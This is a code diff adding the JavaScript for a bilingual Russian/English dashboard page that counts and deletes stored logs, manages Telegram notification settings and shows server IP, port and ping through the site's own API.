+        async function updateLogCount() {
+            try {
+                const response = await fetch('/api/logs/count');
+                if (!response.ok) throw new Error('Failed to fetch log count');
+                const data = await response.json();
+                logCountSpan.textContent = data.count;
+            } catch (error) {
+                console.error('Error fetching log count:', error);
+            }
+        }
+        
+        updateLogCount();
+
+        document.querySelector('.log-grid').addEventListener('click', async (e) => {
+            if (e.target.classList.contains('delete-log-btn') || e.target.closest('.delete-log-btn')) {
+                const button = e.target.classList.contains('delete-log-btn') ? e.target : e.target.closest('.delete-log-btn');
+                const logId = button.dataset.logId;
+                const logFolderName = button.dataset.logFolderName;
+                const logCard = button.closest('.log-card');
+
+                const deleteText = document.querySelector('[data-ru="Удалить"]').textContent;
+                if (confirm(`${deleteText} log ID: ${logId}? This action cannot be undone.`)) {
+                    try {
+                        const response = await fetch(`/api/logs/delete/${logId}/${logFolderName}`, {
+                            method: 'DELETE',
+                        });
+
+                        if (!response.ok) {
+                            const errorData = await response.json();
+                            throw new Error(errorData.detail || 'Failed to delete log.');
+                        }
+
+                        logCard.remove();
+                        updateLogCount();
+                        const successMessage = document.querySelector('[data-ru="Лог удален успешно!"]');
+                        alert(successMessage ? successMessage.textContent : 'Log deleted successfully!');
+                    } catch (error) {
+                        console.error('Error deleting log:', error);
+                        const errorMessage = document.querySelector('[data-ru="Ошибка при удалении лога:"]');
+                        alert(`${errorMessage ? errorMessage.textContent : 'Error deleting log:'} ${error.message}`);
+                    }
+                }
+            }
+        });
+
+        const ruMessages = {
+            "Удалить": "Удалить",
+            "Лог удален успешно!": "Лог удален успешно!",
+            "Ошибка при удалении лога:": "Ошибка при удалении лога:",
+            "Вы уверены, что хотите удалить лог ID:": "Вы уверены, что хотите удалить лог ID:",
+            "Это действие нельзя отменить.": "Это действие нельзя отменить.",
+            "Токен Telegram бота:": "Токен Telegram бота:",
+            "ID чата Telegram:": "ID чата Telegram:",
+            "Включить уведомления": "Включить уведомления",
+            "Сохранить настройки": "Сохранить настройки",
+            "Настройки Telegram обновлены успешно!": "Настройки Telegram обновлены успешно!",
+            "Ошибка при сохранении настроек Telegram:": "Ошибка при сохранении настроек Telegram:",
+            "Не удалось загрузить настройки Telegram": "Не удалось загрузить настройки Telegram",
+            "Нажмите 'Сохранить настройки', чтобы применить изменения.": "Нажмите 'Сохранить настройки', чтобы применить изменения.",
+            "IP Сервера:": "IP Сервера:",
+            "Порт:": "Порт:",
+            "Пинг:": "Пинг:",
+            "мс": "мс",
+            "Загрузка...": "Загрузка..."
+        };
+
+        const enMessages = {
+            "Удалить": "Delete",
+            "Лог удален успешно!": "Log deleted successfully!",
+            "Ошибка при удалении лога:": "Error deleting log:",
+            "Are you sure you want to delete log ID:": "Are you sure you want to delete log ID:",
+            "This action cannot be undone.": "This action cannot be undone.",
+            "Telegram Bot Token:": "Telegram Bot Token:",
+            "Telegram Chat ID:": "Telegram Chat ID:",
+            "Enable Notifications": "Enable Notifications",
+            "Save Settings": "Save Settings",
+            "Telegram settings updated successfully!": "Telegram settings updated successfully!",
+            "Error saving Telegram settings:": "Error saving Telegram settings:",
+            "Failed to fetch Telegram settings": "Failed to fetch Telegram settings",
+            "Click 'Save Settings' to apply changes.": "Click 'Save Settings' to apply changes.",
+            "Server IP:": "Server IP:",
+            "Port:": "Port:",
+            "Ping:": "Ping:",
+            "ms": "ms",
+            "Loading...": "Loading..."
+        };
+        
+        function getLocalizedMessage(key) {
+            const messageKey = key.trim();
+            if (currentLang === 'ru') {
+                return ruMessages[messageKey] || messageKey;
+            } else {
+                return enMessages[messageKey] || messageKey;
+            }
+        }
+
+        const telegramBotTokenInput = document.getElementById('telegramBotToken');
+        const telegramChatIdInput = document.getElementById('telegramChatId');
+        const enableTelegramNotificationsCheckbox = document.getElementById('enableTelegramNotifications');
+        const saveTelegramSettingsBtn = document.getElementById('saveTelegramSettingsBtn');
+        const telegramSettingsTabButton = document.querySelector('[data-tab="telegram-settings-tab"]');
+
+        async function loadTelegramSettings() {
+            try {
+                const response = await fetch('/api/telegram_settings');
+                if (!response.ok) {
+                    let errorMessage = `${getLocalizedMessage('Failed to fetch Telegram settings')}: HTTP status ${response.status}`;
+                    try {
+                        const errorData = await response.json();
+                        if (errorData && errorData.detail) {
+                            errorMessage += ` - Detail: ${errorData.detail}`;
+                        } else {
+                            errorMessage += ` - Response: ${JSON.stringify(errorData)}`;
+                        }
+                    } catch (jsonParseError) {
+                        errorMessage += " (could not parse error response)";
+                    }
+                    throw new Error(errorMessage);
+                }
+                const settings = await response.json();
+                telegramBotTokenInput.value = settings.bot_token || '';
+                telegramChatIdInput.value = settings.chat_id || '';
+                enableTelegramNotificationsCheckbox.checked = settings.enabled;
+            } catch (error) {
+                console.error('Error loading Telegram settings:', error);
+                alert(`${error.message}`);
+            }
+        }
+
+        telegramSettingsTabButton.addEventListener('click', loadTelegramSettings);
+
+        saveTelegramSettingsBtn.addEventListener('click', async () => {
+            const botToken = telegramBotTokenInput.value;
+            const chatId = telegramChatIdInput.value;
+            const enabled = enableTelegramNotificationsCheckbox.checked;
+
+            const formData = new FormData();
+            formData.append('bot_token', botToken);
+            formData.append('chat_id', chatId);
+            formData.append('enabled', enabled);
+
+            try {
+                const response = await fetch('/api/telegram_settings', {
+                    method: 'POST',
+                    body: formData
+                });
+                if (!response.ok) {
+                    const errorData = await response.json();
+                    throw new Error(errorData.detail || 'Unknown error');
+                }
+                alert(getLocalizedMessage('Настройки Telegram обновлены успешно!'));
+            } catch (error) {
+                console.error('Error saving Telegram settings:', error);
+                alert(`${getLocalizedMessage('Ошибка при сохранении настроек Telegram:')} ${error.message}`);
+            }
+        });
+
+        const serverIpSpan = document.getElementById('serverIp');
+        const serverPortSpan = document.getElementById('serverPort');
+        const serverPingSpan = document.getElementById('serverPing');
+
+        async function updateServerInfo() {
+            serverIpSpan.textContent = getLocalizedMessage('Загрузка...');
+            serverPortSpan.textContent = getLocalizedMessage('Загрузка...');
+            serverPingSpan.textContent = getLocalizedMessage('Загрузка...');
+
+            const startTime = performance.now();
+            try {
+                const response = await fetch('/api/server_info');
+                const endTime = performance.now();
+                const ping = Math.round(endTime - startTime);
+
+                if (!response.ok) throw new Error(`HTTP status ${response.status}`);
+                
+                const data = await response.json();
+                serverIpSpan.textContent = data.ip || 'N/A';
+                serverPortSpan.textContent = data.port || 'N/A';
+                serverPingSpan.textContent = `${ping} ${getLocalizedMessage('мс')}`;
+            } catch (error) {
+                console.error('Error fetching server info:', error);
+                serverIpSpan.textContent = 'Error';
+                serverPortSpan.textContent = 'Error';
+                serverPingSpan.textContent = 'Error';
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', updateServerInfo);
+        setInterval(updateServerInfo, 10000);
+    </script>
+</body>
+</html>
